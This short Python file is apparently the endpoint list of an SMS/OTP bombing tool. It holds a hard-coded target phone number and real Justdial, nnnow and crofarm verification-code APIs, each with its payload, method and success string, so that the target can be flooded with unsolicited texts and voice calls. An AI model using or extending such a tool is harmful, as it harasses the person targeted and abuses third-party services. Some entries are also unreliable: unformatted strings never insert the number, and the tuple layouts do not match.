target = 9876448998
# Credits to Ansh Dadwal
target = str(target)
true = "true"
false = "false"

apidata = {

"king":(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?number={target}",{},"GET","sent"),

"king1":("https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?number={target}",{},"GET","sent"),

"nnnow":(f"https://api.nnnow.com/d/api/appDownloadLink",{"mobileNumber": "{target}"},{},"POST","true"),

"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true')

}



apis = [

apidata["king"],
apidata ["king1"],
apidata["nnnow"],
apidata ["gold"]
]
